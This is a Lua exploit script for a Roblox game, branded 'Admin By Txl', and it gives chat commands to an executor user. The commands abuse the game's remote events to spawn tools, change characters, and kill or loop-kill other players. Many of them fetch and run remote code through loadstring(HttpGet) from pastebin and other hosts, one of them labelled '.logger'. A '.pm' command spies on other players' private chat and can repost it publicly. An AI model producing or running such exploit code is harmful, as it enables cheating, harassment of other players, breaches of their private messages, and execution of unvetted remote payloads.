IDFORSPAWNER = 8550867 
game.Workspace.GiveTool:FireServer(IDFORSPAWNER, "SuperFlyGoldBoombox")
game.Workspace.GiveTool:FireServer(IDFORSPAWNER, "PompousTheCloud")
game:GetService("StarterGui"):SetCore("SendNotification", {
  Title = "Macro",
  Text = "E",
  Icon = "rbxassetid://459768485"})
game:GetService("Players").LocalPlayer.Chatted:Connect(function(msg)
    if msg:lower() == ".cmds" then
		print[[--
------------------------- Admin By Txl#7668 ------------------------- 

.cloud --gives u a cloud
.boombox --gives u a boombox
.stroller --gives u the stroller
.glock --gives u a pistol
.ak --gives u a ak
.sbgun -- gives u a submachine gun
.spistol --gives u a Shrek Pistol
.rage --rainbow ragemode
.crab --gives u mr. crabs
.eyes --rainbow eyes
.tag --gives u a tag with my discord
.rtx --loads up rtx admin
.creepy --gives a a creepy statue
.skybox1 -- gives u a big box
.skybox --gives u a big box with the logo of the best group on it
.fat --makes u fat
.marione --gives u a marrionette
.drop --drops the item ur holding
.pm --chat spy
.dom --gives u a shooting dominus
.wmusic --plays music over the workspace
.pika --gives u a pikachu :D
.iphone6 --gives u an iphone 6+
.kill -- kills someone
.lkill --loop kills someone
.goto --goes to player
.rj --rejoins the game
.sm --server message ;)
.large --gives u a uhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh
.fly --makes u fly toggle e
.all --gives u all items
]]
    end
    if msg:lower() == ".glock" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/NvFwvnww"))()
    end
    if msg:lower() == ".cloud" then
        game.Workspace.GiveTool:FireServer(8550867, "PompousTheCloud")
    end
	if msg:lower() == ".large" then
   local UserName  = game:GetService("Players").LocalPlayer.Name 
local Autoride = true 

local Icon, Mesh, Texture = 1553527599, 1358323010, 1553527599
local Name, ToolTip = "KTOOL", "PP"

local CE = {}
local Variables = {
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}

local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName) 

function CE:FireEvent(ItemName, Object, Property, Value) 
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

Variables.workspace.Buy:FireServer(0, "PompousTheCloud") 
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW 

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://"..Icon) 

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://"..Mesh) 
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://"..Texture) 
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(0.009, 0.009, 0.009))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0, 0, 0)) 
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(14.981, 1.759, -11.839)) 

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.117, 0.015, -0.993)) 
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(1.334, 1.76, -0.747)) 
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(0.992, 0.056, -0.116)) 
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.054, 0.998, 0.021)) 

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true) 
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
    end
    
    if msg:lower() == ",plane" then--add cmd inside " "
    local UserName  = game:GetService('Players').LocalPlayer.Name
local Autoride = true

local Icon, Mesh, Texture = 82190148, 469688087, 469688092
local Name, ToolTip = "ub#0001", "Plane"

local CE = {}
local Variables = {
	workspace = game:GetService("Workspace"),
	players = game:GetService("Players")
}

local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)

function CE:FireEvent(ItemName, Object, Property, Value)
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end

Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://"..Icon)

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://"..Mesh)
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://"..Texture)
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(.3,.3,.3))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-35.084))

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(-0.104, -3, -3.86))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 0.996, 0))

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
    end
		if msg:lower() == ".all" then
IDFORSPAWNER = 8550867
workspace.GiveTool:FireServer(IDFORSPAWNER, "BoomboxGearThree")
workspace.GiveTool:FireServer(IDFORSPAWNER, "SuperSpeedCoil")
workspace.GiveTool:FireServer(IDFORSPAWNER, "SuperFlyGoldBoombox")
workspace.GiveTool:FireServer(IDFORSPAWNER, "FluffyUnicorn")
workspace.GiveTool:FireServer(IDFORSPAWNER, "Stroller")
workspace.GiveTool:FireServer(IDFORSPAWNER, "PompousTheCloud")
	end
	if msg:lower() == ".crab" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
		wait()
		loadstring(game:HttpGet("https://pastebin.com/raw/XDwnXx8Z"))()
	end
	if msg:lower() == ".drop" then
	local ToolName = ""
local Counter = 0

for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
if v:IsA("Tool") then
Counter = Counter + 1
ToolName = v.Name
end
end

if Counter >= 1 then
local Tool = game.Players.LocalPlayer.Character[ToolName]
Tool.Parent = game.Workspace
warn("Dropped!")
else
warn("No tool was found.")
end
	end
	if msg:lower() == "" then
	end
	if msg:lower() == ".02" then
		local UserName  = game:GetService('Players').LocalPlayer.Name
local Autoride = true

local Animations = {Shoot = 95383980}
local Icon, Mesh, Texture = 4641765823, 4789775750, 4641765816
local Name, ToolTip = "BOOMER", "yo?"

local CE = {}
local Variables = {
	workspace = game:GetService("Workspace"),
	players = game:GetService("Players")
}

local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)

function CE:FireEvent(ItemName, Object, Property, Value)
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end

Variables.workspace.Buy:FireServer(0, "PompousTheCloud")
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"TextureId","rbxassetid://"..Icon)

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"MeshId","rbxassetid://"..Mesh)
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"TextureId","rbxassetid://"..Texture)
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Scale",Vector3.new(.5,.5,.5))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Orientation",Vector3.new(-0.23,12.94,1.05))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["Handle"]["Mesh"],"Position",Vector3.new(-111.387,3.568,-35.084))

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripForward",Vector3.new(-0.545, -0.089, -0.834))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripPos",Vector3.new(0.2, -5, 0.2))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripRight",Vector3.new(1, -0.026, 0))
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"GripUp",Vector3.new(-0.027, 1.996, -0.089))

CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"ToolTip",ToolTip)
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"CanBeDropped",true)
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"]["LocalScript"],"Disabled",true)
CE:FireEvent("PompousTheCloud",MainUserW["PompousTheCloud"],"Name",Name)
wait()

local Luger = MainUserW["BOOMER"]

MainUserP:GetMouse().Button1Down:Connect(function()
	if MainUserW:FindFirstChild("BOOMER") then
		if MainUserP:GetMouse().Target.Parent:FindFirstChild("HumanoidRootPart") or MainUserP:GetMouse().Target.Parent.Parent:FindFirstChild("HumanoidRootPart") then
			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(0.838, -0.026, -0.545))
			local Animation = Instance.new("Animation")
			Animation.AnimationId = "rbxassetid://95383980"
			local AnimationLoader = MainUserP.Character.Humanoid:LoadAnimation(Animation)
			AnimationLoader:Play()
			AnimationLoader:AdjustSpeed(1)
			wait()
			Variables.workspace.GuiEvent:FireServer(".")
			wait(0.5)
			CE:FireEvent("BOOMER",MainUserW["."]:WaitForChild("Head"),"Parent",MainUserP:GetMouse().Target.Parent)
			CE:FireEvent("BOOMER",BOOMER,"GripRight",Vector3.new(1, -0.026, 0))
		end
	end
end)
    end
	if msg:lower() == ".lol" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
		wait()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/falldrills/j/main/name.lua"))()
	end
	if msg:lower() == "" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
		wait()
		loadstring(game:HttpGet(""))()
	end
	if msg:lower() == ".logger" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
		wait()
		loadstring(game:HttpGet("https://pastebin.com/raw/JLg0VQqj"))()
	end
	if msg:lower() == ".stroller" then
	game.Workspace.GiveTool:FireServer("760040", "Stroller")
    end
	if msg:lower() == ".boom" then 
		game.Workspace.GiveTool:FireServer(760040, "SuperFlyGoldBoombox")
    game.Workspace.GiveTool:FireServer(760040, "PompousTheCloud")
	end
	if msg:lower() == ".marione" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
		wait()
		loadstring(game:HttpGet("https://pastebin.com/raw/qx4tQs2C"))
	end
	if msg:lower() == ".pika" then 
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
		wait()
		loadstring(game:HttpGet("https://pastebin.com/raw/udLfv8D1"))()
	end
    if msg:lower() == ".rj" then
        game:GetService("TeleportService"):Teleport(game.PlaceId, 
        game:GetService("Players").LocalPlayer)
    end
    if msg:lower() == ".sbgun" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/d1axhA"))()
    end
	if msg:lower() == ".creepy" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/uCy35J7q"))()
    end
	if msg:lower() == ".rtx" then
	    loadstring(game:HttpGet("https://vtrxgicv.000webhostapp.com/RTX.lua"))()
	end
    if msg:lower() == ".spistol" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/e9dXvwXm"))()
    end
	if msg:lower() == ".skybox1" then 
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
		wait()
		loadstring(game:HttpGet("https://pastebin.com/raw/U8wJ6FXE"))()
	end
	if msg:lower() == ".skybox" then 
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
		wait()
		loadstring(game:HttpGet("https://pastebin.com/raw/tTBpjTAX"))()
	end
    if msg:lower() == ".ak" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://pastebin.com/raw/RPu5gaJw"))()
    end
	if msg:lower() == ".iphone6" then
		game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
		wait()
		loadstring(game:HttpGet("https://pastebin.com/raw/8bHiXNLT"))()
	end
    if msg:lower() == ".rage" then
        while wait() do
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=139104198")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=74160810")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=400818835")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=606495374")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=6886951")
            wait()
        end
    end
    if msg:lower() == ".eyes" then
        while wait() do
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=335875854")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=335876174")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=335876570")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=335877044")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=335877318")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=335878653")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=335878884")
            wait()
            workspace.Face:FireServer("http://www.roblox.com/asset/?id=335879197")
        end
    end
    if msg:lower() == ".tag" then
local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
    workspace = game:GetService("Workspace"),
    players = game:GetService("Players")
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT
 
 
function CE:FireEvent(ItemName, Object, Property, Value) -- Don't Change the 'Value'
    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end
 
C.workspace.Buy:FireServer(0, "PompousTheCloud") -- Change to your Object
        
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
while wait() do
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Font","Arcade")
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"LineHeight",(5))
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"Size",UDim.new(15,10,15,10))
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","ub#0001")
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(77,7,16))
    wait(0.00000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(77,7,16))
    wait(0.0000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(77,7,16))
    wait(0.0000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(77,7,16))
    wait(0.00000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(77,7,16))
    wait(0.0000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(77,7,16))
    wait(0.00000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(77,7,16))
    wait(0.0000000001)
    CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(77,7,16))
    wait(0.00000000001)
   end
end
		if msg:lower() == ".fly" then
     repeat wait()
   until game.Players.LocalPlayer and game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:findFirstChild("Torso") and game.Players.LocalPlayer.Character:findFirstChild("Humanoid")
local mouse = game.Players.LocalPlayer:GetMouse()
repeat wait() until mouse
local plr = game.Players.LocalPlayer
local torso = plr.Character.Torso
local flying = true
local deb = true
local ctrl = {f = 0, b = 0, l = 0, r = 0}
local lastctrl = {f = 0, b = 0, l = 0, r = 0}
local maxspeed = 50
local speed = 0

function Fly()
local bg = Instance.new("BodyGyro", torso)
bg.P = 9e4
bg.maxTorque = Vector3.new(9e9, 9e9, 9e9)
bg.cframe = torso.CFrame
local bv = Instance.new("BodyVelocity", torso)
bv.velocity = Vector3.new(0,0.1,0)
bv.maxForce = Vector3.new(9e9, 9e9, 9e9)
repeat wait()
plr.Character.Humanoid.PlatformStand = true
if ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0 then
speed = speed+.5+(speed/maxspeed)
if speed > maxspeed then
speed = maxspeed
end
elseif not (ctrl.l + ctrl.r ~= 0 or ctrl.f + ctrl.b ~= 0) and speed ~= 0 then
speed = speed-1
if speed < 0 then
speed = 0
end
end
if (ctrl.l + ctrl.r) ~= 0 or (ctrl.f + ctrl.b) ~= 0 then
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (ctrl.f+ctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(ctrl.l+ctrl.r,(ctrl.f+ctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
lastctrl = {f = ctrl.f, b = ctrl.b, l = ctrl.l, r = ctrl.r}
elseif (ctrl.l + ctrl.r) == 0 and (ctrl.f + ctrl.b) == 0 and speed ~= 0 then
bv.velocity = ((game.Workspace.CurrentCamera.CoordinateFrame.lookVector * (lastctrl.f+lastctrl.b)) + ((game.Workspace.CurrentCamera.CoordinateFrame * CFrame.new(lastctrl.l+lastctrl.r,(lastctrl.f+lastctrl.b)*.2,0).p) - game.Workspace.CurrentCamera.CoordinateFrame.p))*speed
else
bv.velocity = Vector3.new(0,0.1,0)
end
bg.cframe = game.Workspace.CurrentCamera.CoordinateFrame * CFrame.Angles(-math.rad((ctrl.f+ctrl.b)*50*speed/maxspeed),0,0)
until not flying
ctrl = {f = 0, b = 0, l = 0, r = 0}
lastctrl = {f = 0, b = 0, l = 0, r = 0}
speed = 0
bg:Destroy()
bv:Destroy()
plr.Character.Humanoid.PlatformStand = false
end
mouse.KeyDown:connect(function(key)
if key:lower() == "e" then
if flying then flying = false
else
flying = true
Fly()
end
elseif key:lower() == "w" then
ctrl.f = 1
elseif key:lower() == "s" then
ctrl.b = -1
elseif key:lower() == "a" then
ctrl.l = -1
elseif key:lower() == "d" then
ctrl.r = 1
end
end)
mouse.KeyUp:connect(function(key)
if key:lower() == "w" then
ctrl.f = 0
elseif key:lower() == "s" then
ctrl.b = 0
elseif key:lower() == "a" then
ctrl.l = 0
elseif key:lower() == "d" then
ctrl.r = 0
end
end)
Fly()
 
    end
    if msg:lower() == ".sm" then
local UserName  = game:GetService('Players').LocalPlayer.Name
local mesh = 46548937
local texture = 465483155
local CE = {}
local Variables = {
    workspace = game:GetService("Workspace"),
    players = game:GetService("Players")
}

local MainUserP, MainUserW = Variables.players.LocalPlayer, Variables.workspace:FindFirstChild(UserName)

function CE:FireEvent(ItemName, Object, Property, Value)
    MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object})
end


game.Workspace.GiveTool:FireServer(187476, "PompousTheCloud")
MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW

CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Text","Txl is sexy")
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextColor3",Color3.new(0,0,0))
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"TextSize",100)
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"],"Size",UDim.new(15, 0, 5, 0))
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Position",UDim.new(0, -100, 0, -30))
CE:FireEvent("PompousTheCloud",MainUserW["Head"]["NametagTemplate"]["TagText"],"Parent", game.StarterGui.MainGUI)
end
    if msg:lower() == ".fat" then
game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
local UserName  = game:GetService("Players").LocalPlayer.Name -- DON'T EDIT
local Name = "NAME"-- NAME THE TOOL IF WANT 
local CE = {} -- DON'T EDIT
local C = { -- DON'T EDIT
	workspace = game:GetService("Workspace"), 
	players = game:GetService("Players") 
}
local MainUserP, MainUserW = C.players.LocalPlayer, C.workspace:FindFirstChild(UserName) -- DON'T EDIT


function CE:FireEvent(ItemName, Object, Property, Value) -- DON'T EDIT
	MainUserW:FindFirstChild(ItemName)["ServerControl"]:InvokeServer("SetProperty",{["Value"]=Value,["Property"]=Property,["Object"]=Object}) 
end

C.workspace.Buy:FireServer(0, "PompousTheCloud") -- DON'T EDIT

MainUserP["Backpack"]:WaitForChild("PompousTheCloud").Parent = MainUserW
CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Shape","Ball")
CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["Torso"],"Size",Vector3.new(0,0,0))
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Shape","Ball")
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["Right Arm"],"Size",Vector3.new(0,0,0))
CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Shape","Ball")
CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["Left Arm"],"Size",Vector3.new(0,0,0))
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Shape","Ball")
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["Right Leg"],"Size",Vector3.new(0,0,0))
CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Shape","Badll")
CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Shape","Block")
CE:FireEvent("PompousTheCloud",MainUserW["Left Leg"],"Size",Vector3.new(0,0,0))
CE:FireEvent("PompousTheCloud",MainUserW["Shirt"],"ShirtTemplate","rbxassetid://4945805")
CE:FireEvent("PompousTheCloud",MainUserW["Pants"],"PantsTemplate","rbxassetid://8045751")
    end
        if msg:lower() == ".pm" then
        --This script reveals ALL hidden messages in the default chat
--chat "/spy" to toggle!
enabled = true
--if true will check your messages too
spyOnMyself = true
--if true will chat the logs publicly (fun, risky)
public = true
--if true will use /me to stand out
publicItalics = true
--customize private logs
privateProperties = {
	Color = Color3.fromRGB(77,7,16); 
	Font = Enum.Font.SourceSansBold;
	TextSize = 18;
}
--////////////////////////////////////////////////////////////////
local StarterGui = game:GetService("StarterGui")
local Players = game:GetService("Players")
local player = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() or Players.LocalPlayer
local saymsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
local getmsg = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("OnMessageDoneFiltering")
local instance = (_G.chatSpyInstance or 0) + 1
_G.chatSpyInstance = instance

local function onChatted(p,msg)
	if _G.chatSpyInstance == instance then
		if p==player and msg:lower():sub(1,4)==".spy" then
			enabled = not enabled
			wait(0.3)
			privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
			StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
		elseif enabled and (spyOnMyself==true or p~=player) then
			msg = msg:gsub("[\n\r]",''):gsub("\t",' '):gsub("[ ]+",' ')
			local hidden = true
			local conn = getmsg.OnClientEvent:Connect(function(packet,channel)
				if packet.SpeakerUserId==p.UserId and packet.Message==msg:sub(#msg-#packet.Message+1) and (channel=="All" or (channel=="Team" and public==false and Players[packet.FromSpeaker].Team==player.Team)) then
					hidden = false
				end
			end)
			wait(1)
			conn:Disconnect()
			if hidden and enabled then
				if public then
					saymsg:FireServer((publicItalics and "/me " or '').."{SPY} [".. p.Name .."]: "..msg,"All")
				else
					privateProperties.Text = "{SPY} [".. p.Name .."]: "..msg
					StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
				end
			end
		end
	end
end

for _,p in ipairs(Players:GetPlayers()) do
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end
Players.PlayerAdded:Connect(function(p)
	p.Chatted:Connect(function(msg) onChatted(p,msg) end)
end)
privateProperties.Text = "{SPY "..(enabled and "EN" or "DIS").."ABLED}"
StarterGui:SetCore("ChatMakeSystemMessage",privateProperties)
if not player.PlayerGui:FindFirstChild("Chat") then wait(3) end
local chatFrame = player.PlayerGui.Chat.Frame
chatFrame.ChatChannelParentFrame.Visible = true
chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
    end    
        if msg:lower() == ".dom" then
        game.workspace.GiveTool:FireServer("IDFORSPAWNER", "PompousTheCloud")
        wait()
        loadstring(game:HttpGet("https://hastebin.com/raw/asezaleriy"))()
    end
if string.sub(msg,1,6) == ("lnvalid")then
    while true do 
        for i = 0,1,0.1 do 
            game:GetService("ReplicatedStorage").AvatarEditor.BodyColorEvent:FireServer(BrickColor.new(Color3.fromHSV(i,1,1)))    
            wait(.1)
        end    
    end
end
if string.sub(msg,1,4) == ("re")then
    game:GetService("Players").LocalPlayer.Character.Humanoid:ChangeState(15)
end
if string.sub(msg,1,3) == (".rj")then
game:GetService("TeleportService"):Teleport(game.PlaceId, 
game:GetService("Players").LocalPlayer)
end
local gamepassId = IDFORSPAWNER

local RobloxianLife = loadstring(game:HttpGetAsync("https://pastebin.com/raw/HTF0vRHF"))()
local CommandApi = loadstring(game:HttpGetAsync("https://pastebin.com/raw/3mHL7pKv"))()
local players = game:GetService("Players")
local localPlayer = players.localPlayer

RobloxianLife:Initialize(gamepassId)

local function strStarts(String,Start)
    return string.sub(String,1,string.len(Start))==Start
end

local function getPlayerByName(name)
    local plrs = {}

    if name == "me" then
        table.insert(plrs, localPlayer)
        return plrs
    elseif name == "others" then
        for i,v in pairs(players:GetPlayers()) do
            if v.Name ~= localPlayer.Name then
                table.insert(plrs, v)
            end
        end
        return plrs
    elseif name == "all" then
        for i,v in pairs(players:GetPlayers()) do
            table.insert(plrs, v)
        end
        return plrs
    elseif name == "random" then
        table.insert(plrs, players:GetPlayers()[math.random(1, #players:GetPlayers())])
        return plrs
    end

    for i,v in pairs(players:GetPlayers()) do
        if strStarts(v.Name, name) then
            table.insert(plrs, v)
        end
    end
    return plrs
end

CommandApi:AddCommand("lnvalid", function(name)
    for i,v in pairs(getPlayerByName(name)) do
        RobloxianLife:SetLocalProperty(localPlayer.Character.Humanoid, "HipHeight", 0.1)
        RobloxianLife:SetLocalProperty(localPlayer.Character.Humanoid.RootPart.RootJoint, "Part1", v.Character:FindFirstChild'Torso' and v.Character.Torso or v.Character.LowerTorso)
    end
end)

CommandApi:AddCommand("lnvalid", function(mult) 
    mult = tonumber(mult)
    if not mult then return end

    local function multiplycf(cf, m)
        return CFrame.new(cf.p*m)*CFrame.fromOrientation(cf:ToOrientation())
    end

    for i,v in pairs(localPlayer.Character:GetDescendants()) do
        if v:isA"BasePart" then
            RobloxianLife:SetLocalProperty(v,"Size", v.Size*mult)
        elseif v:isA"Motor6D" then
            RobloxianLife:SetLocalProperty(v,"C0", multiplycf(v.C0, mult))
            RobloxianLife:SetLocalProperty(v,"C1", multiplycf(v.C1, mult))
        end
    end
end)

 local chatConnection = localPlayer.Chatted:Connect(CommandApi.OnChatted)

end)
